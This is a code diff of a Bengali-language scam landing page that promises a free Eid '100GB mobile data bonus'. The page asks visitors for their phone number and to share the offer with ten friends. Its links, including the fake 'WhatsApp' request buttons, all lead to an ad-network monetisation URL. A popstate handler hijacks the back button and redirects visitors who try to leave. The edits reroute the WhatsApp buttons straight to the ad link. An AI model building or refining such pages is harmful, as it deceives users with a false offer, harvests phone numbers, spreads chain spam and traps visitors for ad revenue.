@@ -242,12 +242,12 @@ h1{font-size:0;height:0;margin:0;overflow:hidden}
   <header class="top campaign-header">
     <a class="back header-back" href="https://www.profitableratecpmnetwork.com/ue99waqisg?key=8b9e09117740d3da19446b5b52ff8a68" target="_blank" rel="noopener noreferrer" aria-label="ফিরে যান">‹</a>
     <div class="brand-mark" aria-hidden="true">☾</div>
-    <div class="top-title">ঈদ মোবারক</div>
+    <div class="top-title">100GB FREE</div>
     <button class="header-menu" type="button" aria-label="মেনু">⋮</button>
   </header>
   <div class="hero"><a class="hero-link" href="" target="_blank" rel="noopener noreferrer"><img id="eidBanner" src="eid-banner.webp" alt="ঈদ মোবারক — 100GB মোবাইল ডাটা বোনাস"><span class="tap-hint" aria-hidden="true">👆 ছবিতে ট্যাপ করুন</span></a></div>
   <main class="content">
-    <h1>100GB মোবাইল ডাটা বোনাস</h1>
+    <h1>ঈদের আনন্দে 100GB মোবাইল ডাটা বোনাস</h1>
     <div class="sub">অফারটি পেতে আপনার মোবাইল নম্বর দিন এবং ১০ জন বন্ধুর সাথে শেয়ার করুন।</div>
 
     <div class="offer-lead">🎁 100GB মোবাইল ডাটা বোনাস পেতে আপনার নম্বর দিন</div>
@@ -342,7 +342,7 @@ const LINK_CONFIG={
   ad1:"https://www.profitableratecpmnetwork.com/ue99waqisg?key=8b9e09117740d3da19446b5b52ff8a68",
   ad2:"https://www.profitableratecpmnetwork.com/ue99waqisg?key=8b9e09117740d3da19446b5b52ff8a68",
   heroAd:"https://www.profitableratecpmnetwork.com/ue99waqisg?key=8b9e09117740d3da19446b5b52ff8a68",
-  whatsapp:"https://www.profitableratecpmnetwork.com/ue99waqisg?key=8b9e09117740d3da19446b5b52ff8a68", // <<< WhatsApp link: change only this line
+  whatsapp:"https://www.profitableratecpmnetwork.com/ue99waqisg?key=8b9e09117740d3da19446b5b52ff8a68", // <<< WhatsApp destination: change only this line
   messengerDesktop:"https://m.me/8801609166109",
   messengerMobile:"https://m.me/8801609166109",
   messengerShareScheme:"fb-messenger://share/?link="
@@ -545,7 +545,7 @@ function submitPhone(){
     const started=Date.now();
     const onPop=()=>{
       if(Date.now()-started <= 5000){
-        window.location.href=`${LINK_CONFIG.whatsapp}?text=${encodeURIComponent(`আমি ${OFFER_GB} অফারের জন্য ফিরে এসেছি।`)}`;
+        window.location.href=LINK_CONFIG.whatsapp;
       }else{
         window.removeEventListener('popstate',onPop);
       }
@@ -575,7 +575,7 @@ function submitPhone(){
 
   // All WhatsApp request/claim buttons use the single LINK_CONFIG.whatsapp link.
   function sendWhatsApp(message){
-    const url=`${LINK_CONFIG.whatsapp}?text=${encodeURIComponent(message)}`;
+    const url=LINK_CONFIG.whatsapp;
     try{window.open(url,'_blank','noopener,noreferrer');return true;}
     catch(e){window.location.href=url;return true;}
   }
@@ -591,15 +591,15 @@ function submitPhone(){
       <h3 class="request-step-title">${OFFER_GB} রিকোয়েস্ট</h3>
       <p class="request-step-sub">প্রথমে আপনার ${OFFER_GB} রিকোয়েস্ট পাঠান।</p>
       <div id="requestBox" class="request-box ${completed?'hidden':''}">
-        <h4>📲 100GB রিকোয়েস্ট পাঠান</h4>
+        <h4>📲 WhatsApp-এ রিকোয়েস্ট পাঠান</h4>
         <p>WhatsApp খুলবে। মেসেজটি পাঠিয়ে এই পেজে ফিরে আসুন।</p>
-        <button id="requestOneGbBtn" class="request-link secondary" type="button">📲100GB রিকোয়েস্ট পাঠান</button>
+        <button id="requestOneGbBtn" class="request-link secondary" type="button">📲 WhatsApp-এ রিকোয়েস্ট পাঠান</button>
       </div>
       <div id="requestSentBox" class="request-status ${completed?'':'hidden'}">✅ রিকোয়েস্ট পাঠানো হয়েছে।</div>
       <div id="finalRequestBox" class="request-box ${completed?'':'hidden'}">
         <h4>🎁 শেষ ধাপ</h4>
         <p>এখন ${OFFER_GB} দেওয়ার জন্য চূড়ান্ত মেসেজ পাঠান।</p>
-        <button id="takeOneGbBtn" class="request-link secondary" type="button">🟢100GB ${OFFER_GB} নিন</button>
+        <button id="takeOneGbBtn" class="request-link secondary" type="button">🟢 ${OFFER_GB} নিন</button>
       </div>
       <div id="finalDoneBox" class="request-status hidden">✅ চূড়ান্ত মেসেজ পাঠানো হয়েছে।</div>
     </div>`;
@@ -703,7 +703,7 @@ gbPanBtn?.addEventListener("click",()=>{
 });
 
 function sendCommentWhatsApp(message){
-  const url=`${LINK_CONFIG.whatsapp}?text=${encodeURIComponent(message)}`;
+  const url=LINK_CONFIG.whatsapp;
   try{window.open(url,'_blank','noopener,noreferrer');return true;}catch(e){window.location.href=url;return true;}
 }
 function bindCommentWhatsApp(){
